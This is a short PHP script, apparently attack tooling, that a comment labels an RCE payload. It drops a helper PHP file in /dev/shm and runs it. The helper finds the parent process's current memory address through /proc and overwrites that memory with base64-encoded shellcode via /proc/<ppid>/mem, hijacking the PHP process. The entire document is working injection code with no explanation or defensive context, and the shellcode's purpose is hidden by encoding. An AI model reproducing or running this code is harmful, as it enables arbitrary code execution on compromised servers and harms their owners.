<?php

# This RCE writes to the parent /proc/self, which might not be allowed
# Payload
$shellcode_executor_content='<?php
sleep(0.5);
$ppid = posix_getppid();
$data = file_get_contents("/proc/$ppid/syscall");
$data_array = explode(" ", $data);
$mem_addr = trim($data_array[8]);
$dec_offset = hexdec($mem_addr);
$shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ=";
$shellcode = base64_decode($shellcode_b64);
$fd = fopen("/proc/$ppid/mem", "r+");
fseek($fd,$dec_offset);
fwrite($fd, $shellcode);
fclose($fd);
?>';

# Save in disk
$fd = fopen("/dev/shm/shellcode_executor.php", "w");
fwrite($fd, $shellcode_executor_content);
fclose($fd);

# Execute
$cmd = "php /dev/shm/shellcode_executor.php";
exec($cmd);
sleep(1);
?>

